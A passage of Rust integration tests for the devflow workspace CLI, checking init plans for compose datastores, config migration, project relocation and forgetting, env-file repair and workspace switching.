/// A Vite project whose only datastores are `compose`'s, with or without mise.
fn vite_with_compose(env: &Env, compose: &str, mise: bool) {
    let mut files = vec![
        (
            "package.json",
            r#"{"name":"app","scripts":{"dev":"vite"},"devDependencies":{"vite":"5"}}"#,
        ),
        ("bun.lock", "{}\n"),
        ("vite.config.ts", "export default {};\n"),
        ("compose.yaml", compose),
        (".env.example", "REDIS_URL=\nDATABASE_URL=\n"),
    ];
    if mise {
        files.push(("mise.toml", "[tools]\nnode = \"22\"\nbun = \"1.2\"\n"));
    }
    for (path, text) in files {
        std::fs::write(env.repo.join(path), text).unwrap();
    }
}

#[test]
fn init_wires_the_workspace_environment_for_container_only_projects() {
    let cases = [
        (
            "cache only",
            "services:\n  cache:\n    image: redis:7\n",
            "service:cache",
        ),
        (
            "mysql only",
            "services:\n  mysql:\n    image: mysql:8.4\n",
            "service:mysql",
        ),
        (
            "cache and postgres",
            "services:\n  db:\n    image: postgres:16\n  cache:\n    image: redis:7\n",
            "service:cache",
        ),
    ];
    for (label, compose, service) in cases {
        for mise in [false, true] {
            let case = format!("{label}, mise={mise}");
            let env = Env::new();
            vite_with_compose(&env, compose, mise);
            let planned = env.run(&["--json", "init", "--plan", "--name", "shop"]);
            ok(&planned);
            let plan = json(&planned);
            let items = plan["items"].as_array().unwrap();
            let find = |id: &str| {
                items
                    .iter()
                    .find(|item| item["id"] == id)
                    .unwrap_or_else(|| panic!("{case}: {id} in {plan}"))
            };
            let run = "devflow exec -- bun run dev --port $PORT --strictPort";
            assert_eq!(find("daemon:web")["value"]["run"], run, "{case}");
            assert_eq!(
                find("mise:env-file")["value"]["creates_file"],
                !mise,
                "{case}"
            );

            let plan_file = env.root.join("plan.json");
            std::fs::write(&plan_file, &planned.stdout).unwrap();
            let out = env.run(&[
                "--json",
                "init",
                "--apply",
                plan_file.to_str().unwrap(),
                "--accept",
                "daemon:web",
                "--accept",
                "mise:env-file",
                "--accept",
                service,
            ]);
            ok(&out);
            let doc = json(&out);
            assert!(applied(&doc).contains(&"daemon:web"), "{case}: {doc}");
            assert!(applied(&doc).contains(&"mise:env-file"), "{case}: {doc}");
            let pitchfork = std::fs::read_to_string(env.repo.join("pitchfork.toml")).unwrap();
            assert!(
                pitchfork.contains(&format!("run = \"{run}\"")),
                "{case}: {pitchfork}"
            );
            assert_eq!(pitchfork.contains("mise = true"), mise, "{case}");
            let mise_toml = std::fs::read_to_string(env.repo.join("mise.toml")).unwrap();
            assert!(mise_toml.contains(".devflow/env"), "{case}: {mise_toml}");
        }
    }
}

#[test]
fn init_wraps_a_mise_daemon_but_not_a_plain_one_in_a_project_without_services_or_env() {
    // With mise: `mise = true` is set, and `up` refuses such a daemon unless it
    // runs through `devflow exec` (or mise loads `.devflow/env`), so it is
    // wrapped; nothing asks for the mise wiring.
    let env = Env::new();
    vite_with_compose(&env, "services: {}\n", true);
    let plan = json(&env.run(&["--json", "init", "--plan", "--name", "shop"]));
    let items = plan["items"].as_array().unwrap();
    let web = items.iter().find(|i| i["id"] == "daemon:web").unwrap();
    assert_eq!(
        web["value"]["run"],
        "devflow exec -- bun run dev --port $PORT --strictPort"
    );
    assert_eq!(web["value"]["mise"], true);
    assert!(items.iter().all(|i| i["id"] != "mise:env-file"), "{plan}");

    // Without mise, and with nothing exported, the command is left as it is.
    let env = Env::new();
    vite_with_compose(&env, "services: {}\n", false);
    let plan = json(&env.run(&["--json", "init", "--plan", "--name", "shop"]));
    let items = plan["items"].as_array().unwrap();
    let web = items.iter().find(|i| i["id"] == "daemon:web").unwrap();
    assert_eq!(web["value"]["run"], "bun run dev --port $PORT --strictPort");
    assert_eq!(web["value"]["mise"], false);
}

fn setup_hook_runs(env: &Env) -> Vec<String> {
    let (config, _) = devflow_core::Config::load(&env.repo).unwrap();
    config.hooks.setup.iter().map(|h| h.run.clone()).collect()
}

#[test]
fn init_apply_starts_a_declined_service_through_the_compose_hooks() {
    let env = Env::new();
    datastores(
        &env,
        "services:\n  sql:\n    image: mysql:8.4\n  search:\n    image: elasticsearch:8.13.0\n",
    );
    let planned = env.run(&["--json", "init", "--plan", "--name", "shop"]);
    ok(&planned);
    let plan = json(&planned);
    let find = |id: &str| {
        plan["items"]
            .as_array()
            .unwrap()
            .iter()
            .find(|item| item["id"] == id)
            .unwrap_or_else(|| panic!("{id} in {plan}"))
    };
    // The plan reads as if MySQL were branched; the choice is made at apply.
    assert_eq!(
        find("hook:setup:compose-up")["value"]["run"],
        "docker compose up -d --wait search"
    );
    let plan_file = env.root.join("plan.json");
    std::fs::write(&plan_file, &planned.stdout).unwrap();
    let path = plan_file.to_str().unwrap();

    // MySQL left unchecked (a preview is never a default): compose starts it.
    let out = env.run(&[
        "--json",
        "init",
        "--apply",
        path,
        "--accept",
        "hook:setup:compose-up",
        "--accept",
        "hook:switch:compose-up",
    ]);
    ok(&out);
    let doc = json(&out);
    assert!(!applied(&doc).contains(&"service:mysql"), "{doc}");
    assert!(applied(&doc).contains(&"hook:setup:compose-up"), "{doc}");
    assert_eq!(
        setup_hook_runs(&env),
        vec!["docker compose up -d --wait search sql"]
    );
    let config = std::fs::read_to_string(env.config_path()).unwrap();
    assert!(!config.contains("[services"), "{config}");
    ok(&env.run(&["--json", "list"]));
}

#[test]
fn init_apply_with_mysql_accepted_leaves_only_the_rest_to_compose() {
    let env = Env::new();
    datastores(
        &env,
        "services:\n  sql:\n    image: mysql:8.4\n  search:\n    image: elasticsearch:8.13.0\n",
    );
    let plan_file = env.root.join("plan.json");
    std::fs::write(
        &plan_file,
        &env.run(&["--json", "init", "--plan", "--name", "shop"])
            .stdout,
    )
    .unwrap();
    let out = env.run(&[
        "--json",
        "init",
        "--apply",
        plan_file.to_str().unwrap(),
        "--accept",
        "service:mysql",
        "--accept",
        "hook:setup:compose-up",
    ]);
    ok(&out);
    assert_eq!(
        setup_hook_runs(&env),
        vec!["docker compose up -d --wait search"]
    );
    let config = std::fs::read_to_string(env.config_path()).unwrap();
    assert!(config.contains("[services.mysql]"), "{config}");
}

#[test]
fn init_apply_with_a_rejected_cache_keeps_it_in_the_compose_hook() {
    let env = Env::new();
    datastores(
        &env,
        "services:\n  cache:\n    image: redis:7\n  search:\n    image: elasticsearch:8.13.0\n",
    );
    let plan_file = env.root.join("plan.json");
    std::fs::write(
        &plan_file,
        &env.run(&["--json", "init", "--plan", "--name", "shop"])
            .stdout,
    )
    .unwrap();
    let path = plan_file.to_str().unwrap();
    // Rejected: compose starts both.
    let out = env.run(&[
        "--json",
        "init",
        "--apply",
        path,
        "--reject",
        "service:cache",
        "--accept",
        "hook:setup:compose-up",
    ]);
    ok(&out);
    let doc = json(&out);
    assert!(!applied(&doc).contains(&"service:cache"), "{doc}");
    assert_eq!(
        setup_hook_runs(&env),
        vec!["docker compose up -d --wait cache search"]
    );
    // The saved plan is untouched, so applying it again with the same
    // choices is recognised as done, not refused as stale.
    let again = env.run(&[
        "--json",
        "init",
        "--apply",
        path,
        "--reject",
        "service:cache",
        "--accept",
        "hook:setup:compose-up",
    ]);
    ok(&again);
    assert_eq!(json(&again)["already_applied"], true);
}

// --- projects that cannot be opened -----------------------------------------

const PRE_RELEASE: &str = "[project]\nname = \"tt2\"\nid = \"3f2b1c7e-0b3c-4d2e-9a7a-8f6d5c4b3a21\"\n\n# The database.\n[postgres]\nmode = \"managed\"\nimage = \"postgres:18\"\n";

#[test]
fn an_error_carries_its_remedies_as_hint_lines_and_as_data() {
    let env = Env::new();
    let out = env.run(&["list"]);
    failed(&out);
    assert!(
        !stderr(&out).contains("run `devflow init` first"),
        "the message is CLI-free: {}",
        describe(&out)
    );
    let doc = json(&env.run(&["--json", "list"]));
    assert!(
        !doc["error"].as_str().unwrap().contains("devflow init"),
        "{doc}"
    );
    let remedies = doc["remedies"].as_array().unwrap();
    assert_eq!(remedies[0]["kind"], "init");
    assert_eq!(remedies[0]["label"], "Set up devflow…");
    assert_eq!(remedies[0]["command"], "devflow init");
    assert_eq!(remedies[0]["root"], env.repo.to_str().unwrap());
}

#[test]
fn a_pre_release_configuration_points_at_its_migration() {
    let env = Env::new();
    std::fs::write(env.config_path(), PRE_RELEASE).unwrap();
    let out = env.run(&["list"]);
    failed(&out);
    assert!(
        stderr(&out).contains("hint: run `devflow config migrate`"),
        "{}",
        describe(&out)
    );
    let doc = json(&env.run(&["--json", "list"]));
    assert_eq!(doc["remedies"][0]["kind"], "migrate_config", "{doc}");
}

#[test]
fn config_migrate_shows_the_change_then_writes_it() {
    let env = Env::new();
    std::fs::write(env.config_path(), PRE_RELEASE).unwrap();

    let dry = env.run(&["--json", "config", "migrate", "--dry-run"]);
    ok(&dry);
    let doc = json(&dry);
    assert_eq!(doc["migrated"], false);
    assert_eq!(doc["dry_run"], true);
    assert_eq!(doc["service_key"], "db");
    assert_eq!(doc["files"][0]["file"], "devflow.toml");
    assert_eq!(
        std::fs::read_to_string(env.config_path()).unwrap(),
        PRE_RELEASE,
        "a dry run writes nothing"
    );

    let human = env.run(&["config", "migrate", "--dry-run"]);
    ok(&human);
    assert!(
        stdout(&human).contains("- [postgres]"),
        "{}",
        describe(&human)
    );
    assert!(
        stdout(&human).contains("+ [services.db]"),
        "{}",
        describe(&human)
    );

    let done = env.run(&["--json", "config", "migrate"]);
    ok(&done);
    assert_eq!(json(&done)["migrated"], true);
    let text = std::fs::read_to_string(env.config_path()).unwrap();
    assert!(
        text.contains("# The database.\n[services.db]\nengine = \"postgres\"\n"),
        "{text}"
    );
    ok(&env.run(&["--json", "list"]));

    // Nothing is left to do.
    let again = env.run(&["--json", "config", "migrate"]);
    ok(&again);
    assert_eq!(json(&again)["migrated"], false);
}

#[test]
fn config_migrate_previews_never_carry_local_credentials() {
    let env = Env::new();
    std::fs::write(
        env.config_path(),
        "[project]\nname = \"tt2\"\nid = \"3f2b1c7e-0b3c-4d2e-9a7a-8f6d5c4b3a21\"\n",
    )
    .unwrap();
    let local = env.repo.join("devflow.local.toml");
    std::fs::write(
        &local,
        "[env]\nDB_PASS = \"hunter2-local\"\nSESSION_KEY = \"session-secret-7\"\n[postgres]\nmode = \"managed\"\n", // kingfisher:ignore
    )
    .unwrap();
    for args in [
        &["--json", "config", "migrate", "--dry-run"][..],
        &["config", "migrate", "--dry-run"][..],
    ] {
        let out = env.run(args);
        ok(&out);
        let text = describe(&out);
        assert!(
            !text.contains("hunter2-local") && !text.contains("session-secret-7"),
            "{text}"
        );
        assert!(text.contains("SESSION_KEY"), "{text}");
    }
    // The written file keeps the real values.
    ok(&env.run(&["--json", "config", "migrate"]));
    let written = std::fs::read_to_string(&local).unwrap();
    assert!(written.contains("session-secret-7") && written.contains("[services.db]")); // kingfisher:ignore
}

#[test]
fn config_migrate_refuses_what_it_cannot_rewrite_and_says_why() {
    let env = Env::new();
    let text = format!("{PRE_RELEASE}\n[services.main]\nengine = \"postgres\"\n");
    std::fs::write(env.config_path(), &text).unwrap();
    let out = env.run(&["--json", "config", "migrate"]);
    failed(&out);
    let doc = json(&out);
    assert!(doc["error"].as_str().unwrap().contains("both"), "{doc}");
    assert_eq!(std::fs::read_to_string(env.config_path()).unwrap(), text);
}

#[test]
fn the_project_list_shows_problems_and_can_be_mended() {
    let env = Env::new();
    env.init();
    ok(&env.run(&["list"])); // registers the project
    let listed = json(&env.run(&["--json", "list", "--all"]));
    let project = listed["projects"][0].clone();
    let id = project["id"].as_str().unwrap().to_string();
    assert!(project.get("problem").is_none(), "{project}");

    // The folder moves away.
    let moved = env.root.join("moved");
    std::fs::rename(&env.repo, &moved).unwrap();
    let doc = json(&env.run_in(&env.root, &["--json", "list", "--all"]));
    let problem = &doc["projects"][0]["problem"];
    assert_eq!(problem["kind"], "folder_missing", "{doc}");
    assert_eq!(problem["remedies"][0]["kind"], "locate_project");
    assert!(
        problem["remedies"][1]["command"]
            .as_str()
            .unwrap()
            .starts_with("devflow project forget")
    );
    let human = env.run_in(&env.root, &["list", "--all"]);
    assert!(
        stdout(&human).contains("hint: if the folder moved"),
        "{}",
        describe(&human)
    );

    // A folder that is not that project is refused; the right one is accepted.
    let other = env.root.join("other");
    std::fs::create_dir_all(&other).unwrap();
    git2::Repository::init(&other).unwrap();
    failed(&env.run_in(
        &env.root,
        &["project", "relocate", &id, other.to_str().unwrap()],
    ));
    let relocated = env.run_in(
        &env.root,
        &[
            "--json",
            "project",
            "relocate",
            &id,
            moved.to_str().unwrap(),
        ],
    );
    ok(&relocated);
    assert_eq!(json(&relocated)["project"]["root"], moved.to_str().unwrap());
    let doc = json(&env.run_in(&env.root, &["--json", "list", "--all"]));
    assert!(doc["projects"][0].get("problem").is_none(), "{doc}");

    // Forgetting removes the entry and leaves the folder.
    let forgotten = env.run_in(&env.root, &["--json", "project", "forget", &id]);
    ok(&forgotten);
    assert_eq!(json(&forgotten)["forgotten"][0]["id"], id.as_str());
    assert!(moved.join("devflow.toml").is_file());
    let doc = json(&env.run_in(&env.root, &["--json", "list", "--all"]));
    assert_eq!(doc["projects"].as_array().unwrap().len(), 0);
}

#[test]
fn forgetting_missing_projects_leaves_the_others() {
    let env = Env::new();
    env.init();
    ok(&env.run(&["list"]));
    let gone = env.root.join("gone");
    std::fs::create_dir_all(&gone).unwrap();
    git2::Repository::init(&gone).unwrap();
    ok(&env.run_in(&gone, &["init", "--yes", "--name", "gone"]));
    std::fs::remove_dir_all(&gone).unwrap();

    let out = env.run(&["--json", "project", "forget", "--missing"]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["forgotten"].as_array().unwrap().len(), 1, "{doc}");
    assert_eq!(doc["forgotten"][0]["name"], "gone");
    let listed = json(&env.run(&["--json", "list", "--all"]));
    assert_eq!(listed["projects"].as_array().unwrap().len(), 1);
}

#[test]
fn forgetting_missing_projects_lists_what_it_removes() {
    let env = Env::new();
    env.init();
    ok(&env.run(&["list"]));
    let gone = env.root.join("gone");
    std::fs::create_dir_all(&gone).unwrap();
    git2::Repository::init(&gone).unwrap();
    ok(&env.run_in(&gone, &["init", "--yes", "--name", "gone"]));
    std::fs::remove_dir_all(&gone).unwrap();

    // Nothing is asked when there is no terminal, but the list is shown.
    let out = env.run(&["project", "forget", "--missing"]);
    ok(&out);
    let text = stdout(&out);
    assert!(
        text.contains("was not found") && text.contains("not connected"),
        "{}",
        describe(&out)
    );
    assert!(
        text.contains("  gone (") && text.contains("Removed 'gone'"),
        "{}",
        describe(&out)
    );
    let listed = json(&env.run(&["--json", "list", "--all"]));
    assert_eq!(listed["projects"].as_array().unwrap().len(), 1);

    // -y is accepted; with nothing missing nothing is removed.
    let again = env.run(&["project", "forget", "--missing", "-y"]);
    ok(&again);
    assert!(
        stdout(&again).contains("No listed project"),
        "{}",
        describe(&again)
    );
}

fn forgotten_names(out: &Output) -> Vec<String> {
    json(out)["forgotten"]
        .as_array()
        .unwrap()
        .iter()
        .map(|p| p["name"].as_str().unwrap().to_string())
        .collect()
}

#[test]
fn project_paths_are_taken_from_dash_c_not_the_process_directory() {
    let env = Env::new();
    env.init();
    ok(&env.run(&["list"]));
    let other = env.root.join("other");
    std::fs::create_dir_all(&other).unwrap();
    git2::Repository::init(&other).unwrap();
    ok(&env.run_in(&other, &["init", "--yes", "--name", "other"]));
    ok(&env.run_in(&other, &["list"]));
    let other_dir = other.to_str().unwrap();

    // The process runs in the repository; `.` is the folder `-C` names.
    let forgotten = env.run(&["--json", "-C", other_dir, "project", "forget", "."]);
    ok(&forgotten);
    assert_eq!(json(&forgotten)["forgotten"][0]["root"], other_dir);
    let listed = json(&env.run(&["--json", "list", "--all"]));
    let names: Vec<_> = listed["projects"]
        .as_array()
        .unwrap()
        .iter()
        .map(|p| p["name"].as_str().unwrap().to_string())
        .collect();
    assert_eq!(names, ["shop"], "{listed}");

    // A project that moved: its old folder no longer exists, and both the old
    // and the new folder are relative to `-C`.
    let id = listed["projects"][0]["id"].as_str().unwrap().to_string();
    std::fs::rename(&env.repo, env.root.join("moved")).unwrap();
    let root = env.root.to_str().unwrap();
    let relocated = env.run_in(
        &other,
        &["--json", "-C", root, "project", "relocate", "repo", "moved"],
    );
    ok(&relocated);
    let doc = json(&relocated);
    assert_eq!(doc["project"]["id"], id.as_str(), "{doc}");
    assert_eq!(
        doc["project"]["root"],
        env.root.join("moved").to_str().unwrap()
    );
    // And a folder that is gone can still be forgotten by its relative path.
    std::fs::remove_dir_all(env.root.join("moved")).unwrap();
    let forgotten = env.run_in(
        &other,
        &["--json", "-C", root, "project", "forget", "moved"],
    );
    ok(&forgotten);
    assert_eq!(forgotten_names(&forgotten), ["shop"]);
}

#[test]
fn config_migrate_uses_dash_c_and_does_not_hide_a_broken_configuration() {
    let env = Env::new();
    std::fs::write(env.config_path(), PRE_RELEASE).unwrap();
    let elsewhere = env.root.join("elsewhere");
    std::fs::create_dir_all(&elsewhere).unwrap();
    let out = env.run_in(
        &elsewhere,
        &[
            "--json",
            "-C",
            env.repo.to_str().unwrap(),
            "config",
            "migrate",
            "--dry-run",
        ],
    );
    ok(&out);
    assert_eq!(json(&out)["service_key"], "db");

    // `[postgres]` with TOML that does not parse: an error, not "nothing to do".
    let broken = format!("{PRE_RELEASE}port = = 1\n");
    std::fs::write(env.config_path(), &broken).unwrap();
    for args in [
        &["--json", "config", "migrate"][..],
        &["config", "migrate"][..],
    ] {
        let out = env.run(args);
        failed(&out);
        let text = describe(&out);
        assert!(text.contains("invalid TOML"), "{text}");
        assert!(!text.contains("Nothing to migrate"), "{text}");
    }
    assert_eq!(std::fs::read_to_string(env.config_path()).unwrap(), broken);

    // A 0.x configuration without the table is refused, with the guide.
    std::fs::write(
        env.config_path(),
        "[project]\nname = \"tt2\"\nid = \"3f2b1c7e-0b3c-4d2e-9a7a-8f6d5c4b3a21\"\n\n[agent]\nx = 1\n",
    )
    .unwrap();
    let out = env.run(&["--json", "config", "migrate"]);
    failed(&out);
    assert_eq!(
        json(&out)["remedies"][0]["kind"],
        "open_guide",
        "{}",
        describe(&out)
    );

    // A valid current configuration is a successful no-op.
    std::fs::write(
        env.config_path(),
        "[project]\nname = \"tt2\"\nid = \"3f2b1c7e-0b3c-4d2e-9a7a-8f6d5c4b3a21\"\n",
    )
    .unwrap();
    let out = env.run(&["--json", "config", "migrate"]);
    ok(&out);
    assert_eq!(json(&out)["migrated"], false);
}

// --- activation ------------------------------------------------------------

/// `git clean -fdx` in a workspace's checkout.
fn clean_checkout(path: &Path) {
    let _ = std::fs::remove_dir_all(path.join(".devflow"));
}

#[test]
fn setup_and_switch_rebuild_a_cleaned_checkouts_env_file() {
    let env = Env::new();
    env.init();
    env.edit_config("setup = []", "setup = [\"echo ran >> ../setup-ran\"]");
    let trusted = |dir: &Path, args: &[&str]| {
        env.command(dir)
            .args(args)
            .env("DEVFLOW_TRUST_HOOKS", "1")
            .output()
            .unwrap()
    };
    let doc = json(ok(&trusted(
        &env.repo,
        &[
            "--json",
            "--non-interactive",
            "switch",
            "-c",
            "feature/clean",
        ],
    )));
    let path = PathBuf::from(doc["path"].as_str().unwrap());
    let ran = || std::fs::read_to_string(path.parent().unwrap().join("setup-ran")).unwrap();
    assert_eq!(ran().lines().count(), 1);
    let workspace_in = |dir: &Path| {
        let out = env
            .command(dir)
            .args(["exec", "--", "sh", "-c", "echo $DEVFLOW_WORKSPACE"])
            .output()
            .unwrap();
        (out.status.success(), stdout(&out).trim().to_string())
    };
    assert_eq!(workspace_in(&path), (true, "feature/clean".into()));

    // `git clean -fdx`: exec refuses, and says what to do.
    clean_checkout(&path);
    let out = env
        .command(&path)
        .args(["exec", "--", "true"])
        .output()
        .unwrap();
    failed(&out);
    assert!(stderr(&out).contains("devflow setup"), "{}", describe(&out));

    // The advice is true: setup rebuilds it, says so, and runs no hook again.
    let out = trusted(&path, &["--json", "--non-interactive", "setup"]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["status"], "ready", "{doc}");
    assert_eq!(doc["repaired"], json!(["env_file"]), "{doc}");
    assert_eq!(workspace_in(&path), (true, "feature/clean".into()));
    assert_eq!(ran().lines().count(), 1, "no hook ran again");
    let out = trusted(&path, &["--json", "--non-interactive", "setup"]);
    assert_eq!(json(ok(&out))["repaired"], json!([]));

    // So does switching to it, and the human output says what happened.
    clean_checkout(&path);
    let out = env.run(&["--non-interactive", "switch", "feature/clean"]);
    ok(&out);
    assert!(
        stderr(&out).contains("rebuilt .devflow/env"),
        "{}",
        describe(&out)
    );
    assert_eq!(workspace_in(&path), (true, "feature/clean".into()));
    assert_eq!(ran().lines().count(), 1);
}

#[test]
fn a_checkout_on_another_branch_is_listed_and_found_by_the_workspace_it_belongs_to() {
    let env = Env::new();
    env.init();
    let doc = json(ok(&env.run(&[
        "--json",
        "--non-interactive",
        "switch",
        "-c",
        "feature/a",
    ])));
    let path = PathBuf::from(doc["path"].as_str().unwrap());
    let git = git2::Repository::open(&path).unwrap();
    let head = git.head().unwrap().peel_to_commit().unwrap();
    git.branch("other", &head, false).unwrap();
    git.set_head("refs/heads/other").unwrap();

    // The listing says whose data the checkout holds, in words and in JSON.
    let doc = json(&env.run(&["--json", "list"]));
    let item = doc["workspaces"]
        .as_array()
        .unwrap()
        .iter()
        .find(|w| w["workspace"]["name"] == "feature/a")
        .unwrap_or_else(|| panic!("{doc}"));
    assert_eq!(item["workspace"]["branch"], "other", "{item}");
    assert_eq!(item["drift"]["workspace"], "feature/a", "{item}");
    assert_eq!(item["drift"]["branch"], "other", "{item}");
    let table = stdout(ok(&env.run(&["list"])));
    assert!(
        table.contains("now on branch other; its data still belongs to workspace feature/a"),
        "{table}"
    );

    // The workspace is still found by its name, and by the branch it holds.
    for name in ["feature/a", "other"] {
        let out = env.run(&["path", name]);
        ok(&out);
        assert!(
            same_path(&stdout(&out), &path),
            "{name}: {}",
            describe(&out)
        );
    }
    let out = env.run(&["--json", "--non-interactive", "switch", "feature/a"]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["drift"]["branch"], "other", "{doc}");
    assert_eq!(doc["workspace"]["name"], "feature/a", "{doc}");
    let out = env.run(&["--non-interactive", "switch", "feature/a"]);
    assert!(
        stderr(&out).contains("now on branch other; its data still belongs to workspace feature/a"),
        "{}",
        describe(&out)
    );

    // Its variables are still the workspace's.
    let out = env
        .command(&path)
        .args(["exec", "--", "sh", "-c", "echo $DEVFLOW_WORKSPACE"])
        .output()
        .unwrap();
    assert_eq!(stdout(ok(&out)).trim(), "feature/a");
}

#[test]
fn the_first_switch_to_the_main_checkout_says_it_runs_setup_there() {
    let env = Env::new();
    env.init();
    env.edit_config("setup = []", "setup = [\"echo ran >> setup-ran.txt\"]");
    let name = json(&env.run(&["--json", "list"]))["workspaces"][0]["workspace"]["name"]
        .as_str()
        .unwrap()
        .to_string();
    let switch = |args: &[&str]| {
        env.command(&env.repo)
            .args(args)
            .env("DEVFLOW_TRUST_HOOKS", "1")
            .output()
            .unwrap()
    };
    let out = switch(&["--json", "--non-interactive", "switch", &name]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["first_setup"], true, "{doc}");
    assert_eq!(doc["status"], "ready", "{doc}");
    assert!(
        stderr(&out).contains("setup runs now in the main checkout")
            && stderr(&out).contains("setup hooks included"),
        "{}",
        describe(&out)
    );
    assert_eq!(
        std::fs::read_to_string(env.repo.join("setup-ran.txt"))
            .unwrap()
            .lines()
            .count(),
        1
    );
    // Only the first time.
    let out = switch(&["--json", "--non-interactive", "switch", &name]);
    ok(&out);
    assert_eq!(json(&out)["first_setup"], false);
    assert!(
        !stderr(&out).contains("main checkout"),
        "{}",
        describe(&out)
    );
}

#[test]
fn a_devflow_started_by_a_switch_hook_gets_busy_instead_of_waiting() {
    let env = Env::new();
    env.init();
    let nested = format!(
        "{} --json --non-interactive setup > nested.json 2> nested.err; echo $? > nested.code",
        env!("CARGO_BIN_EXE_devflow")
    );
    env.edit_config(
        "setup = []",
        &format!("setup = []\nswitch = [\"{nested}\"]"),
    );
    let started = std::time::Instant::now();
    let out = env
        .command(&env.repo)
        .args(["--json", "--non-interactive", "switch", "-c", "feature/h"])
        .env("DEVFLOW_TRUST_HOOKS", "1")
        .output()
        .unwrap();
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["status"], "ready", "{doc}");
    assert_eq!(doc["switch_hooks"]["ok"], true, "{doc}");
    let path = PathBuf::from(doc["path"].as_str().unwrap());
    // The nested setup was refused as busy (exit 2, `in_progress`), not run
    // and not waited for.
    assert_eq!(
        std::fs::read_to_string(path.join("nested.code"))
            .unwrap()
            .trim(),
        "2"
    );
    let nested = json_file(&path.join("nested.json"));
    assert_eq!(nested["status"], "in_progress", "{nested}");
    assert!(started.elapsed() < std::time::Duration::from_secs(60));
}

fn json_file(path: &Path) -> Value {
    serde_json::from_slice(&std::fs::read(path).unwrap()).unwrap()
}

#[test]
fn a_name_that_means_two_workspaces_is_refused_with_their_paths() {
    let env = Env::new();
    env.init();
    let create = |name: &str| {
        let doc = json(ok(&env.run(&[
            "--json",
            "--non-interactive",
            "switch",
            "-c",
            name,
        ])));
        PathBuf::from(doc["path"].as_str().unwrap())
    };
    let (a, b) = (create("feature/a"), create("feature/b"));
    // `a` moves to another branch, and `b` takes the branch `a` had.
    let git = git2::Repository::open(&a).unwrap();
    let head = git.head().unwrap().peel_to_commit().unwrap();
    git.branch("other", &head, false).unwrap();
    git.set_head("refs/heads/other").unwrap();
    git2::Repository::open(&b)
        .unwrap()
        .set_head("refs/heads/feature/a")
        .unwrap();

    for args in [
        &["path", "feature/a"][..],
        &["--non-interactive", "switch", "feature/a"][..],
        &["remove", "feature/a"][..],
    ] {
        let out = env.run(args);
        failed(&out);
        let text = stderr(&out);
        assert!(
            text.contains("names more than one workspace")
                && text.contains(&a.display().to_string())
                && text.contains(&b.display().to_string()),
            "{args:?}: {}",
            describe(&out)
        );
        assert!(text.contains("hint:"), "{args:?}: {}", describe(&out));
    }
    assert!(
        a.exists() && b.exists(),
        "a refused removal removed nothing"
    );
    let doc = json(&env.run(&["--json", "path", "feature/a"]));
    assert_eq!(doc["remedies"][0]["kind"], "use_path", "{doc}");

    // The names that mean one workspace, and the paths, still work.
    for (name, expected) in [("other", &a), ("feature/b", &b)] {
        let out = env.run(&["path", name]);
        assert!(same_path(&stdout(ok(&out)), expected), "{name}");
    }
    let out = env.run(&["remove", a.to_str().unwrap()]);
    ok(&out);
    assert!(!a.exists() && b.exists());
}

#[test]
fn list_says_when_a_set_up_workspace_lost_its_env_file() {
    let env = Env::new();
    env.init();
    let doc = json(ok(&env.run(&[
        "--json",
        "--non-interactive",
        "switch",
        "-c",
        "feature/g",
    ])));
    let path = PathBuf::from(doc["path"].as_str().unwrap());
    clean_checkout(&path);

    let table = stdout(ok(&env.run(&["list"])));
    assert!(
        table.contains("feature/g: .devflow/env is missing"),
        "{table}"
    );
    assert!(
        !table.contains("`devflow"),
        "a note names the file, never a command: {table}"
    );
    let doc = json(&env.run(&["--json", "list"]));
    let item = doc["workspaces"]
        .as_array()
        .unwrap()
        .iter()
        .find(|w| w["workspace"]["name"] == "feature/g")
        .unwrap();
    assert_eq!(item["env_file"], "missing", "{item}");
    assert_eq!(item["status"], "ready", "the status is the receipt's");

    // Entering it writes the file again, and the note is gone.
    ok(&env.run(&["--non-interactive", "switch", "feature/g"]));
    assert!(path.join(".devflow/env").is_file());
    assert!(!stdout(ok(&env.run(&["list"]))).contains("env is missing"));
}

// --- navigation: picker, `-`, subdirectories, completion, open ---------------

/// Commit `files` (relative path, content) on the repository's current branch.
fn commit_files(env: &Env, files: &[(&str, &str)]) {
    let git = git2::Repository::open(&env.repo).unwrap();
    let mut index = git.index().unwrap();
    for (path, content) in files {
        let full = env.repo.join(path);
        std::fs::create_dir_all(full.parent().unwrap()).unwrap();
        std::fs::write(&full, content).unwrap();
        index.add_path(Path::new(path)).unwrap();
    }
    index.write().unwrap();
    let tree = git.find_tree(index.write_tree().unwrap()).unwrap();
    let parent = git.head().unwrap().peel_to_commit().unwrap();
    let sig = git2::Signature::now("Test", "test@example.com").unwrap();
    git.commit(Some("HEAD"), &sig, &sig, "files", &tree, &[&parent])
        .unwrap();
}

/// The name of the main checkout's workspace (its branch: `master` or `main`
/// depending on Git's configuration).
fn default_name(env: &Env) -> String {
    let doc = json(&env.run(&["--json", "list"]));
    doc["workspaces"][0]["workspace"]["name"]
        .as_str()
        .unwrap()
        .to_string()
}

/// A workspace `name` created through the CLI; its path.
fn workspace(env: &Env, name: &str) -> PathBuf {
    let out = env.run(&["--json", "--non-interactive", "switch", "-c", name]);
    ok(&out);
    PathBuf::from(json(&out)["path"].as_str().unwrap())
}

/// Run `switch` the way the shell wrapper does, and read where it asked the
/// shell to go.
fn switch_through_wrapper(
    env: &Env,
    dir: &Path,
    args: &[&str],
    previous: Option<&Path>,
) -> (Output, String) {
    let handoff = env.root.join("cd-file");
    std::fs::write(&handoff, "").unwrap();
    let mut command = env.command(dir);
    command
        .args(["--non-interactive", "switch"])
        .args(args)
        .env("DEVFLOW_CD_FILE", &handoff)
        .env("DEVFLOW_WRAPPED", "1");
    if let Some(previous) = previous {
        command.env("DEVFLOW_PREVIOUS", previous);
    }
    let out = command.output().unwrap();
    let target = std::fs::read_to_string(&handoff).unwrap();
    (out, target)
}

#[test]
fn switch_without_a_name_needs_a_terminal_and_says_what_to_do() {
    let env = Env::new();
    env.init();
    let out = env.run(&["switch"]);
    failed(&out);
    assert!(stderr(&out).contains("no terminal"), "{}", describe(&out));
    assert!(
        stderr(&out).contains("hint: name a workspace: `devflow list`"),
        "{}",
        describe(&out)
    );
    let doc = json(&env.run(&["--json", "switch"]));
    assert!(
        doc["error"].as_str().unwrap().contains("no terminal"),
        "{doc}"
    );
    assert_eq!(doc["remedies"][0]["kind"], "choose_workspace", "{doc}");
    // `-c` still needs its name.
